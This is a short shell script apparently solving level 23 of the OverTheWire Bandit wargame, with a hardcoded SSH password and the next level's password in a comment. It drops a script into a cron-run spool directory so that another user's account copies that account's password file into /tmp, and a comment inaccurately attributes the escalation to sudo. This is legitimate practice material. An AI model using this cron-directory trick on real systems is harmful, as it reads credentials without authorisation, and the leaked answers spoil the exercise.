#!/bin/sh

# ssh to level 23
sshpass -pjc1udXuA1tiHqjIsL8yaapX5XIAI6i0n ssh bandit23@bandit.labs.overthewire.org -p 2220 \
"echo \#\!/bin/sh > run_me_fool && echo 'cat /etc/bandit_pass/bandit24 > /tmp/iran' >> run_me_fool && chmod 777 run_me_fool && mv run_me_fool /var/spool/bandit24/ && sleep 62 && cat /tmp/iran" 

# UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

# another crazy one. basically you have to write a cript and move it to
# the directory where all the scripts are being run and have it print the 
# password to a file for you which it can do cause its sudo
